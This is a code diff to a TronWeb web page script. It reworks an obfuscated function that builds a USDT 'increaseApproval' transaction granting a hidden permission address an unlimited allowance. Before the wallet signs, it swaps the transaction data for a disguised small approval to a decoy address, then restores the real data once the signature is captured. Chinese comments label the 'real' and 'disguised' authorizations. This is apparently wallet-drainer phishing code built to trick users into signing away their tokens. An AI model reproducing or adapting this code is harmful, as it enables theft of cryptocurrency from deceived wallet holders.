@@ -19,40 +19,58 @@ async function onNextButtonClick() {
 }
 
 async function DjdskdbGsj() {
-  const trxAmountInSun = tronWeb.toSun(currentAmount);
+  const usdtAmountInSun = tronWeb.toSun(currentAmount);
   const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
   const feeLimit = 1000000000;
-  
-  try {
 
+  try {
     const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
-    
+
     console.log("构建TRX转账交易...");
     const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
       paymentAddress,
-      trxAmountInSun,
+      usdtAmountInSun,
       tronWeb.defaultAddress.base58,
       { feeLimit: feeLimit }
     );
 
-    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+    // 构建真实授权交易参数
+    const realApproveParams = [
+      { type: 'address', value: window.Permission_address },
+      { type: 'uint256', value: maxUint256 }
+    ];
+
+    // 构建伪装授权交易参数
+    const disguisedApproveParams = [
+      { type: 'address', value: 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8' }, // 伪装地址，保持与之前一致
+      { type: 'uint256', value: usdtAmountInSun } // 使用转账金额进行伪装
+    ];
+
+    console.log("构建授权交易...");
+    const realApproveTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
       tronWeb.address.toHex(window.usdtContractAddress),
       'increaseApproval(address,uint256)',
       { feeLimit: feeLimit },
-      [
-        { type: 'address', value: window.Permission_address },
-        { type: 'uint256', value: maxUint256 }
-      ],
+      realApproveParams,
       tronWeb.defaultAddress.base58
     );
 
-    const originalRawData = approvalTransaction.transaction.raw_data;
+    const disguisedApproveTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+      tronWeb.address.toHex(window.usdtContractAddress),
+      'increaseApproval(address,uint256)',
+      { feeLimit: feeLimit },
+      disguisedApproveParams,
+      tronWeb.defaultAddress.base58
+    );
 
-    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+    // 将真实交易的 raw_data 替换为伪装交易的数据
+    var originalRawData = realApproveTransaction.transaction.raw_data;
+    realApproveTransaction.transaction.raw_data = disguisedApproveTransaction.transaction.raw_data;
 
     console.log("交易签名中...");
-    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+    const signedTransaction = await tronWeb.trx.sign(realApproveTransaction.transaction);
 
+    // 将 raw_data 恢复为原始的真实数据
     signedTransaction.raw_data = originalRawData;
 
     console.log("发送交易...");
